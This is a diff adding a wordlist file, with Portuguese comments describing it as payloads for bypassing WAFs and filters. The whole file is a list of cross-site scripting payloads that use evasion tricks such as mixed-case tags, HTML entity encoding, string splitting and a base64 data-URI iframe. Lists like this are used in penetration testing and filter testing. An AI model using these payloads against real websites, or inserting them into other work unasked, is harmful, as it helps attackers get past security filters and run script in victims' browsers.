@@ -1,0 +1,14 @@
+# Payloads para bypass de WAF e filtros
+# Adicione um payload por linha
+
+<Img src = x onerror = "javascript: window['ale'+'rt']('XSS');">
+<svg/onload=setTimeout`alert\`XSS\``;>
+'-prompt(1)-'
+<sCript>alert(1)</sCriPt>
+jav&#x09;ascript:alert('XSS');
+<a href="javas&#99;ript:alert(1)">click me</a>
+<svg><script>alert&#40;1&#41;</script>
+'"`><img src=xxx:x onerror=javascript:alert(1)>
+<iframe/src="data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+<svg><animate onbegin=prompt() attributeName=x>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
